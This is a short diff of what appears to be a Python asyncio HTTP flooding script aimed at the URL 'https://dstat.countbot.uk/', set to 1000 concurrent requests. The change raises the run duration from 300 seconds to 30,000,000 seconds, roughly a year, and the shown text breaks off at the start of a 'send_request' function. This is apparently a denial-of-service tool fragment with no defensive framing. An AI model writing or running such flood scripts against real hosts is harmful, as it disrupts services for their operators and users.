@@ -5,7 +5,7 @@ import time
 
 TARGET_URL = "https://dstat.countbot.uk/"
 CONCURRENT_REQUESTS = 1000
-DURATION = 300  # ثانیه
+DURATION = 30000000  # ثانیه
 
 async def send_request(session):
     try:
